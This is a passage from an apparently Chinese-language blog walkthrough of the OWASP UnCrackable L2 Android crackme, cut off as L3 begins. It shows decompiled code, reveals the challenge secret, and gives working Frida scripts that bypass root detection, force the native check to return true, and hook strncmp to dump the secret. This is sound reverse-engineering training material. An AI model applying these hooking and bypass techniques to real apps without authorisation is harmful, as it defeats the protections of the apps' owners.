class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs typescript">package sg.<span class="hljs-property">vantagepoint</span>.<span class="hljs-property">uncrackable2</span>;<br><br><span class="hljs-keyword">import</span> android.<span class="hljs-property">app</span>.<span class="hljs-property">AlertDialog</span>;<br><span class="hljs-keyword">import</span> android.<span class="hljs-property">content</span>.<span class="hljs-property">DialogInterface</span>;<br><span class="hljs-keyword">import</span> android.<span class="hljs-property">os</span>.<span class="hljs-property">AsyncTask</span>;<br><span class="hljs-keyword">import</span> android.<span class="hljs-property">os</span>.<span class="hljs-property">Bundle</span>;<br><span class="hljs-keyword">import</span> android.<span class="hljs-property">os</span>.<span class="hljs-property">Debug</span>;<br><span class="hljs-keyword">import</span> android.<span class="hljs-property">os</span>.<span class="hljs-property">SystemClock</span>;<br><span class="hljs-keyword">import</span> android.<span class="hljs-property">support</span>.<span class="hljs-property">v7</span>.<span class="hljs-property">app</span>.<span class="hljs-property">c</span>;<br><span class="hljs-keyword">import</span> android.<span class="hljs-property">view</span>.<span class="hljs-property">View</span>;<br><span class="hljs-keyword">import</span> android.<span class="hljs-property">widget</span>.<span class="hljs-property">EditText</span>;<br><span class="hljs-keyword">import</span> owasp.<span class="hljs-property">mstg</span>.<span class="hljs-property">uncrackable2</span>.<span class="hljs-property">R</span>;<br><span class="hljs-keyword">import</span> sg.<span class="hljs-property">vantagepoint</span>.<span class="hljs-property">a</span>.<span class="hljs-property">a</span>;<br><span class="hljs-keyword">import</span> sg.<span class="hljs-property">vantagepoint</span>.<span class="hljs-property">a</span>.<span class="hljs-property">b</span>;<br><br><span class="hljs-comment">/* loaded from: classes.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">c</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">CodeCheck</span> m;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-title class_">System</span>.<span class="hljs-title function_">loadLibrary</span>(<span class="hljs-string">&quot;foo&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: private */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">a</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> str</span>) &#123;<br>        <span class="hljs-title class_">AlertDialog</span> create = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AlertDialog</span>.<span class="hljs-title class_">Builder</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-title function_">create</span>();<br>        create.<span class="hljs-title function_">setTitle</span>(str);<br>        create.<span class="hljs-title function_">setMessage</span>(<span class="hljs-string">&quot;This is unacceptable. The app is now going to exit.&quot;</span>);<br>        create.<span class="hljs-title function_">setButton</span>(-<span class="hljs-number">3</span>, <span class="hljs-string">&quot;OK&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DialogInterface</span>.<span class="hljs-title class_">OnClickListener</span>() &#123; <span class="hljs-comment">// from class: sg.vantagepoint.uncrackable2.MainActivity.1</span><br>            <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.content.DialogInterface.OnClickListener</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">onClick</span>(<span class="hljs-params">DialogInterface dialogInterface, int i</span>) &#123;<br>                <span class="hljs-title class_">System</span>.<span class="hljs-title function_">exit</span>(<span class="hljs-number">0</span>);<br>            &#125;<br>        &#125;);<br>        create.<span class="hljs-title function_">setCancelable</span>(<span class="hljs-literal">false</span>);<br>        create.<span class="hljs-title function_">show</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> native <span class="hljs-built_in">void</span> <span class="hljs-title function_">init</span>();<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: protected */</span><br>    <span class="hljs-comment">/* JADX WARN: Type inference failed for: r0v4, types: [sg.vantagepoint.uncrackable2.MainActivity$2] */</span><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.support.v7.app.c, android.support.v4.app.h, android.support.v4.app.z, android.app.Activity</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">onCreate</span>(<span class="hljs-params">Bundle bundle</span>) &#123;<br>        <span class="hljs-title function_">init</span>();<br>        <span class="hljs-keyword">if</span> (b.<span class="hljs-title function_">a</span>() || b.<span class="hljs-title function_">b</span>() || b.<span class="hljs-title function_">c</span>()) &#123;<br>            <span class="hljs-title function_">a</span>(<span class="hljs-string">&quot;Root detected!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (a.<span class="hljs-title function_">a</span>(<span class="hljs-title function_">getApplicationContext</span>())) &#123;<br>            <span class="hljs-title function_">a</span>(<span class="hljs-string">&quot;App is debuggable!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AsyncTask</span>&lt;<span class="hljs-title class_">Void</span>, <span class="hljs-title class_">String</span>, <span class="hljs-title class_">String</span>&gt;() &#123; <span class="hljs-comment">// from class: sg.vantagepoint.uncrackable2.MainActivity.2</span><br>            <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: protected */</span><br>            <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.os.AsyncTask</span><br>            <span class="hljs-comment">/* renamed from: a */</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">doInBackground</span>(<span class="hljs-params">Void... voidArr</span>) &#123;<br>                <span class="hljs-keyword">while</span> (!<span class="hljs-title class_">Debug</span>.<span class="hljs-title function_">isDebuggerConnected</span>()) &#123;<br>                    <span class="hljs-title class_">SystemClock</span>.<span class="hljs-title function_">sleep</span>(100L);<br>                &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br><br>            <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: protected */</span><br>            <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.os.AsyncTask</span><br>            <span class="hljs-comment">/* renamed from: a */</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">onPostExecute</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> str</span>) &#123;<br>                <span class="hljs-title class_">MainActivity</span>.<span class="hljs-property">this</span>.<span class="hljs-title function_">a</span>(<span class="hljs-string">&quot;Debugger detected!&quot;</span>);<br>            &#125;<br>        &#125;.<span class="hljs-title function_">execute</span>(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">m</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CodeCheck</span>();<br>        <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">onCreate</span>(bundle);<br>        <span class="hljs-title function_">setContentView</span>(R.<span class="hljs-property">layout</span>.<span class="hljs-property">activity_main</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">verify</span>(<span class="hljs-params">View view</span>) &#123;<br>        <span class="hljs-title class_">String</span> str;<br>        <span class="hljs-title class_">String</span> obj = ((<span class="hljs-title class_">EditText</span>) <span class="hljs-title function_">findViewById</span>(R.<span class="hljs-property">id</span>.<span class="hljs-property">edit_text</span>)).<span class="hljs-title function_">getText</span>().<span class="hljs-title function_">toString</span>();<br>        <span class="hljs-title class_">AlertDialog</span> create = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AlertDialog</span>.<span class="hljs-title class_">Builder</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-title function_">create</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">m</span>.<span class="hljs-title function_">a</span>(obj)) &#123;<br>            create.<span class="hljs-title function_">setTitle</span>(<span class="hljs-string">&quot;Success!&quot;</span>);<br>            str = <span class="hljs-string">&quot;This is the correct secret.&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            create.<span class="hljs-title function_">setTitle</span>(<span class="hljs-string">&quot;Nope...&quot;</span>);<br>            str = <span class="hljs-string">&quot;That&#x27;s not it. Try again.&quot;</span>;<br>        &#125;<br>        create.<span class="hljs-title function_">setMessage</span>(str);<br>        create.<span class="hljs-title function_">setButton</span>(-<span class="hljs-number">3</span>, <span class="hljs-string">&quot;OK&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DialogInterface</span>.<span class="hljs-title class_">OnClickListener</span>() &#123; <span class="hljs-comment">// from class: sg.vantagepoint.uncrackable2.MainActivity.3</span><br>            <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.content.DialogInterface.OnClickListener</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">onClick</span>(<span class="hljs-params">DialogInterface dialogInterface, int i</span>) &#123;<br>                dialogInterface.<span class="hljs-title function_">dismiss</span>();<br>            &#125;<br>        &#125;);<br>        create.<span class="hljs-title function_">show</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>主逻辑跟L1的类似，只是verify的方法中判断逻辑改为了<code>CodeCheck</code>的a方法。</p><h4 id="CodeCheck"><a href="#CodeCheck" class="headerlink" title="CodeCheck"></a>CodeCheck</h4><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">package</span> sg.<span class="hljs-property">vantagepoint</span>.<span class="hljs-property">uncrackable2</span>;<br><br><span class="hljs-comment">/* loaded from: classes.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CodeCheck</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">bar</span>(<span class="hljs-type">byte</span>[] bArr);<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">a</span>(<span class="hljs-built_in">String</span> <span class="hljs-built_in">str</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">bar</span>(<span class="hljs-built_in">str</span>.<span class="hljs-property">getBytes</span>());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个类中的a方法调用了一个native方法bar，将输入提交的字符串给so文件中的方法去处理，如果native方法返回true就会显示输入了正确的secret。</p><h4 id="libfoo-so"><a href="#libfoo-so" class="headerlink" title="libfoo.so"></a>libfoo.so</h4><p>导出表中有下面两个函数，可以看出该JNI调用符合静态注册的特征，<code>Java_sg_vantagepoint_uncrackable2_CodeCheck_bar</code>函数就是CodeCheck中的native bar方法。这里其实看ida逆向之后的逻辑就可以知道secret就是<code>Thanks for all the fish</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">Java_sg_vantagepoint_uncrackable2_MainActivity_init</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br><br>  result = sub_720();<br>  byte_4008 = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br>_BOOL4 __cdecl <span class="hljs-title function_">Java_sg_vantagepoint_uncrackable2_CodeCheck_bar</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2, <span class="hljs-type">int</span> a3)</span><br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// esi</span><br>  _BOOL4 result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> s2[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [esp+0h] [ebp-2Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp+18h] [ebp-14h]</span><br><br>  v6 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  result = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( byte_4008 == <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">strcpy</span>(s2, <span class="hljs-string">&quot;Thanks for all the fish&quot;</span>);<br>    v3 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)(*(<span class="hljs-type">int</span> (__cdecl **)(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>, _DWORD))(*(_DWORD *)a1 + <span class="hljs-number">736</span>))(a1, a3, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> ( (*(<span class="hljs-type">int</span> (__cdecl **)(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>))(*(_DWORD *)a1 + <span class="hljs-number">684</span>))(a1, a3) == <span class="hljs-number">23</span> &amp;&amp; !<span class="hljs-built_in">strncmp</span>(v3, s2, <span class="hljs-number">0x17</span>u) )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>导入表</p><p><img src="/images/image-20231206170744015.png"></p><p>其实这里已经得到了secret的信息，后面我们可以尝试hook native层的导入函数尝试获取这个secret并且让bar函数一直返回true</p><h3 id="Frida脚本"><a href="#Frida脚本" class="headerlink" title="Frida脚本"></a>Frida脚本</h3><h4 id="勾取bar函数一直返回true"><a href="#勾取bar函数一直返回true" class="headerlink" title="勾取bar函数一直返回true"></a>勾取bar函数一直返回true</h4><p>绕过root检测逻辑与L1一致，setTimeout是想等加载完成再hook libfoo.so，或许有更优雅的方法暂时还没想到。然后就寻找导出函数地址进行attach，在函数返回时进行返回值替换即可。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;    <br>    <span class="hljs-keyword">var</span> func = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;sg.vantagepoint.a.b&#x27;</span>);<br>    func.<span class="hljs-property">a</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;;<br>func.<span class="hljs-property">b</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;;<br>func.<span class="hljs-property">c</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;;<br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">x</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">var</span> func_addr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libfoo.so&quot;</span>,<span class="hljs-string">&quot;Java_sg_vantagepoint_uncrackable2_CodeCheck_bar&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(func_addr);<br><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(func_addr, &#123;<br><span class="hljs-comment">//onEnter: function(args)顾名思义就是进入该函数前要执行的代码，其中args是传入的参数，一般so层函数第一个参数都是JniEnv，第二个参数是jclass，从第三个参数开始才是我们java层传入的参数</span><br><span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hook start&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;args[2]=&quot;</span> + args[<span class="hljs-number">2</span>]); <span class="hljs-comment">//打印我们java层第一个传入的参数，这里是字节数组指针地址byte[] bArr</span><br>&#125;,<br><span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>)&#123; <span class="hljs-comment">//onLeave: function(retval)是该函数执行结束要执行的代码，其中retval参数即是返回值</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;return original value:&quot;</span>+retval); <span class="hljs-comment">//打印原始返回值</span><br>retval.<span class="hljs-title function_">replace</span>(<span class="hljs-number">1</span>);<br>&#125;<br>&#125;);<br>&#125;, <span class="hljs-number">1000</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>执行下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">frida -U -f owasp.mstg.uncrackable2 -l frida_script.js<br></code></pre></td></tr></table></figure><p>然后在页面任意输入一个值：</p><p><img src="/images/image-20231207181412335.png"></p><p>得到下面的输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[SM-N976N::owasp.mstg.uncrackable2 ]-&gt; 0x71fe24863110<br>Hook start<br>args[2]=0x7ffead4209a8<br><span class="hljs-built_in">return</span> original value:0x0<br></code></pre></td></tr></table></figure><p>已经成功勾取并修改了返回值，APP输入任意字符都可以显示成功。</p><h3 id="勾取secret"><a href="#勾取secret" class="headerlink" title="勾取secret"></a>勾取secret</h3><p>我们遍历libfoo的导入表，找到strncmp的调用，随后attach到strncmp。在上面的伪代码中可以看到，<code>!strncmp(v3, s2, 0x17u)</code>在调用时会传入数据长度0x17，也就是十进制数23，因此我们筛选出调用参数长度为23的strncmp即可，因此加了if去确定，随后”test_len_23_for_frida_u”时一段长度为23的随意的字符串，目的是为了继续做筛选，根据我们填入的字符串值去反向推导。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;    <br>    <span class="hljs-keyword">var</span> func = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;sg.vantagepoint.a.b&#x27;</span>);<br>    func.<span class="hljs-property">a</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;;<br>func.<span class="hljs-property">b</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;;<br>func.<span class="hljs-property">c</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;;<br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">x</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-comment">//得到libfoo中所有关于strncmp的调用</span><br><span class="hljs-keyword">var</span> strncmp = <span class="hljs-literal">undefined</span>;<br><span class="hljs-keyword">var</span> imports = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">enumerateImportsSync</span>(<span class="hljs-string">&quot;libfoo.so&quot;</span>);<br><br><span class="hljs-keyword">for</span>( <span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; imports.<span class="hljs-property">length</span>; i++) &#123;<br><span class="hljs-keyword">if</span>(imports[i].<span class="hljs-property">name</span> == <span class="hljs-string">&quot;strncmp&quot;</span>) &#123;<br>strncmp = imports[i].<span class="hljs-property">address</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(strncmp);<br><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(strncmp, &#123;<br><span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) &#123;<br><span class="hljs-keyword">if</span>(args[<span class="hljs-number">2</span>].<span class="hljs-title function_">toInt32</span>() == <span class="hljs-number">23</span> &amp;&amp; <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">0</span>],<span class="hljs-number">23</span>) == <span class="hljs-string">&quot;test_len_23_for_frida_u&quot;</span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] Secret string at &quot;</span> + args[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;: &quot;</span> + <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">1</span>],<span class="hljs-number">23</span>));<br>&#125;<br>&#125;,<br>&#125;);<br>&#125;, <span class="hljs-number">1000</span>);<br>&#125;);<br><br></code></pre></td></tr></table></figure><p>运行<code>frida -U -f owasp.mstg.uncrackable2 -l frida_script.js</code></p><p>然后再输入<code>test_len_23_for_frida_u</code>点击verify即可</p><p><img src="/images/image-20231207190649721.png"></p><p>随后就可以在控制台看到secret字符串。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[SM-N976N::owasp.mstg.uncrackable2 ]-&gt; 0x71feb22a5270<br>[*] Secret string at 0x7ffead420940: Thanks <span class="hljs-keyword">for</span> all the fish<br></code></pre></td></tr></table></figure><h2 id="Android-UnCrackable-L3"><a href="#Android-UnCrackable-L3" class="headerlink" title="Android UnCrackable L3"></a>Android UnCrackable L3</h2><h3 id="分析逻辑-2"><a href="#分析逻辑-2" class="headerlink" title="分析逻辑"></a>分析逻辑</h3><h4 id="MainActivity-1"><a href="#MainActivity-1" class="headerlink" title="MainActivity"></a>MainActivity</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> sg.vantagepoint.uncrackable3;<br><br><span class="hljs-keyword">import</span> android.app.AlertDialog;<br><span class="hljs-keyword">import</span> android.content.DialogInterface;<br><span class="hljs-keyword">import</span> android.os.AsyncTask;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.os.Debug;<br><span class="hljs-keyword">import</span> android.os.SystemClock;<br><span class="hljs-keyword">import</span> android.support.v7.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> android.util.Log;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.EditText;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.zip.ZipEntry;<br><span class="hljs-keyword">import</span> java.util.zip.ZipFile;<br><span class="hljs-keyword">import</span> sg.vantagepoint.util.IntegrityCheck;<br><span class="hljs-keyword">import</span> sg.vantagepoint.util.RootDetection;<br><br><span class="hljs-comment">/* loaded from: classes.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span 